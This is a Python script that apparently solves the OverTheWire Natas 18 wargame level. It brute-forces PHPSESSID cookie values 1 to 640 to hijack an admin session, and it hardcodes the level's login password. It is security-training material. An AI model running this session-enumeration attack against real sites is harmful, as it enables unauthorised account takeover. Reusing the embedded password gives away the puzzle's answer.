#!/usr/bin/python3

import requests

BASE_URL = "http://natas18.natas.labs.overthewire.org?debug"
EXPECTED_OUTPUT = "You are an admin."
AUTHENTICATION = {'username': 'natas18',
                  'password': 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'}


def is_valid_url(url: str, cookies: dict, expected_output: str) -> bool:
    """
    Check if the given URL returns the expected output.
    """
    session = requests.Session()
    session.auth = (AUTHENTICATION['username'], AUTHENTICATION['password'])
    response = session.get(url=url, cookies=cookies)

    data = response.text
    return expected_output in data


def run_brute_force() -> int:
    """
    Starts brute force and return result.
    """
    cookies_dict = dict(PHPSESSID=1)
    for i in range(1, 641):
        cookies_dict['PHPSESSID'] = str(i)
        # go through all possible session ids
        if is_valid_url(BASE_URL, cookies_dict, EXPECTED_OUTPUT):
            return i
    return -1


def main():
    print("Starting brute force...")
    admin_id = run_brute_force()
    print("Brute force result:", admin_id)


if __name__ == "__main__":
    main()
